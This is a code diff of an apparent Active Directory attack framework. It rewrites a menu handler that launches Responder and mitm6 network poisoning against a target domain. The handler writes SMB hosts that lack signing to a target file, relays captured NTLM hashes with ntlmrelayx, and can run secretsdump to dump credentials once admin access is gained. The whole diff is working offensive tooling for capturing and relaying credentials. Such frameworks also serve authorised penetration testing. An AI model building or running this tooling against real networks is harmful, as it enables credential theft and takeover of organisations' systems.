@@ -372,115 +372,92 @@ class AttackMenu:
             
         input("\nPress Enter to continue...")
 
-    def handle_poisoning(self, attack_type: str):
+    def handle_poisoning(self):
         """
-        Handle network poisoning and MITM attacks.
-        
-        Supported attack types:
-        - LLMNR/NBT-NS/mDNS poisoning
-        - IPv6 DNS takeover
-        - WPAD/PAC injection
-        - ARP poisoning
-        - Traffic manipulation
-        
-        Features:
-        - Automatic relay target detection
-        - Post-exploitation integration
-        - Real-time credential capture
-        
-        Args:
-            attack_type: Type of poisoning attack to perform
+        Handle network poisoning and MITM attacks using Responder, mitm6, and ntlmrelayx
         """
         self.clear_screen()
-        print(f"\n=== {attack_type} Attack ===")
+        print("""
+╔══════════════════════════════════════╗
+║      Network Poisoning Attacks       ║
+╠══════════════════════════════════════╣
+║ 1. Responder Only (Hash Capture)     ║
+║ 2. IPv6 DNS Takeover (mitm6)        ║
+║ 3. Full Attack (Responder + mitm6)   ║
+║ 0. Back                             ║
+╚══════════════════════════════════════╝
+""")
+
+        choice = input("\nSelect option: ")
         
-        interface = input("\nEnter interface to listen on (default: 0.0.0.0): ") or "0.0.0.0"
+        if choice == "0":
+            return
+            
+        if choice not in ["1", "2", "3"]:
+            print("Invalid option")
+            input("\nPress Enter to continue...")
+            return
+
+        # Get common parameters
+        interface = input("\nEnter interface to listen on (e.g., eth0): ")
+        target_domain = input("Enter target domain (e.g., corp.local): ")
         
-        if attack_type in ["LLMNR", "NBT-NS", "mDNS"]:
-            respond_ip = input("Enter IP to respond with (default: interface IP): ") or None
-            
-            # Check for potential relay targets
-            targets = self.db.get_smb_targets(signing_required=False)
-            if targets:
-                print(f"\nFound {len(targets)} potential relay targets (SMB signing not required):")
-                for ip, hostname, _ in targets:
-                    hostname_str = f"({hostname})" if hostname else ""
-                    print(f"  - {ip} {hostname_str}")
-                relay = input("\nAttempt to relay captured hashes? (y/n): ").lower() == 'y'
+        # Check for potential relay targets
+        targets = self.db.get_smb_targets(signing_required=False)
+        if targets:
+            print(f"\nFound {len(targets)} potential relay targets (SMB signing not required):")
+            for ip, hostname, _ in targets:
+                hostname_str = f"({hostname})" if hostname else ""
+                print(f"  - {ip} {hostname_str}")
                 
-                if relay:
-                    print("\nRelay Options:")
-                    print("1. Basic relay (attempt authentication only)")
-                    print("2. Advanced relay (attempt secretsdump on successful admin access)")
-                    relay_option = input("\nSelect option (1-2): ")
-                    post_exploit = relay_option == "2"
-                else:
-                    post_exploit = False
-            else:
-                print("\nNo potential relay targets found (all discovered hosts require SMB signing)")
-                relay = False
-                post_exploit = False
-            
-            if attack_type == "LLMNR":
-                self.poisoning_attacks.start_llmnr_poisoning(interface, respond_ip, relay, post_exploit)
-            elif attack_type == "NBT-NS":
-                self.poisoning_attacks.start_nbtns_poisoning(interface, respond_ip, relay, post_exploit)
-            else:  # mDNS
-                self.poisoning_attacks.start_mdns_poisoning(interface, respond_ip, relay, post_exploit)
-                
-        elif attack_type == "IPv6":
-            respond_ip = input("Enter IPv6 address to respond with (default: interface IPv6): ") or None
+            # Write targets to file
+            with open('/tmp/adaf_poisoning/targets.txt', 'w') as f:
+                for ip, _, _ in targets:
+                    f.write(f'smb://{ip}\n')
+                    
             relay = input("\nAttempt to relay captured hashes? (y/n): ").lower() == 'y'
-            post_exploit = False
+            
             if relay:
-                post_exploit = input("Attempt post-exploitation on successful relay? (y/n): ").lower() == 'y'
-                
-            self.poisoning_attacks.start_ipv6_poisoning(interface, respond_ip, relay, post_exploit)
+                print("\nPost-Exploitation Options:")
+                print("1. Basic relay (attempt authentication only)")
+                print("2. Advanced relay (attempt secretsdump on successful admin access)")
+                post_exploit = input("\nSelect option (1-2): ") == "2"
+        else:
+            print("\nNo potential relay targets found (all discovered hosts require SMB signing)")
+            relay = False
+            post_exploit = False
+
+        # Set attack type based on choice
+        if choice == "1":
+            attack_type = "responder"
+        elif choice == "2":
+            attack_type = "mitm6"
+        else:
+            attack_type = "all"
+
+        # Start the attack
+        if self.poisoning_attacks.start_poisoning_attack(
+            interface=interface,
+            target_domain=target_domain,
+            attack_type=attack_type,
+            relay=relay,
+            post_exploit=post_exploit
+        ):
+            print("\nPoisoning attack started successfully!")
+            print("\nMonitoring for authentication attempts...")
+            if relay:
+                print("ntlmrelayx.py started - watching for successful relays...")
+                if post_exploit:
+                    print("Post-exploitation enabled - will attempt secretsdump on admin access...")
             
-        elif attack_type == "WPAD/PAC":
-            proxy_ip = input("Enter proxy IP address: ")
-            proxy_port = int(input("Enter proxy port (default: 8080): ") or "8080")
-            use_ssl = input("Use HTTPS for WPAD? (y/n): ").lower() == 'y'
+            print("\nPress Enter to stop the attack...")
+            input()
             
-            self.poisoning_attacks.start_wpad_poisoning(interface, proxy_ip, proxy_port, use_ssl)
+            self.poisoning_attacks.stop_poisoning_attack()
+            print("\nPoisoning attack stopped")
+        else:
+            print("\nFailed to start poisoning attack")
             
-        elif attack_type == "ARP":
-            target_ip = input("Enter target IP to poison: ")
-            gateway_ip = input("Enter gateway IP: ")
-            interval = int(input("Enter interval between packets (seconds, default: 1): ") or "1")
-            
-            self.poisoning_attacks.start_arp_poisoning(interface, target_ip, gateway_ip, interval)
-            
-        else:  # Traffic Manipulation
-            target_ip = input("Enter target IP: ")
-            print("\nSelect protocol to manipulate:")
-            print("1. HTTP")
-            print("2. SMB")
-            protocol = input("\nSelect option (1-2): ")
-            protocol = 'http' if protocol == "1" else 'smb'
-            
-            port = int(input(f"\nEnter {protocol.upper()} port: "))
-            
-            print("\nSelect manipulation type:")
-            print("1. Inject content")
-            print("2. Protocol downgrade")
-            manip_type = input("\nSelect option (1-2): ")
-            manip_type = 'inject' if manip_type == "1" else 'downgrade'
-            
-            self.poisoning_attacks.start_traffic_manipulation(
-                interface, target_ip, protocol, port, manip_type
-            )
-            
-        print("\nPoisoning attack started. Press Enter to stop...")
-        print("\nMonitoring for authentication attempts...")
-        if 'relay' in locals() and relay:
-            print("ntlmrelayx.py started - watching for successful relays...")
-            if post_exploit:
-                print("Post-exploitation enabled - will attempt secretsdump on admin access...")
-        input()
-        
-        self.poisoning_attacks.stop_poisoning()
-        print("\nPoisoning attack stopped")
         input("\nPress Enter to continue...")
 
     def handle_coercion(self, attack_type: str):
